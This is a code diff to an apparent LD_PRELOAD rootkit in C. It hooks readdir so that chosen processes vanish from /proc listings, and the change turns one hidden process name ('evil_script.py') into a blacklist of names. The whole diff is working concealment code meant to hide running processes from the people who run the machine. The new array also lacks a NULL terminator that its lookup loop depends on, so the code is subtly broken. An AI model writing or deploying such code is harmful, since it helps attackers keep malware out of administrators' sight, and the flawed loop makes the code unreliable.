@@ -9,7 +9,10 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* BLACKLIST[] = {
+    "process_1", 
+    "process_2"
+};
 
 /*
  * Get a directory name given a DIR* handle
@@ -61,13 +64,27 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
+static int is_process_blacklisted(char* process_name)
+{
+    int  i = 0;
+    while (BLACKLIST[i]){
+        if (strcmp(process_name, BLACKLIST[i]) == 0)
+        {
+            return 1;
+        }   
+        i++;
+    }
+
+    return 0;
+}
+
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
 struct dirent* readdir(DIR *dirp)                                       \
 {                                                                       \
     if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
         if(original_##readdir == NULL)                                  \
         {                                                               \
             fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
@@ -82,10 +99,10 @@ struct dirent* readdir(DIR *dirp)                                       \
         if(dir) {                                                       \
             char dir_name[256];                                         \
             char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&       \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                is_process_blacklisted(process_name) == 1) {            \
                 continue;                                               \
             }                                                           \
         }                                                               \
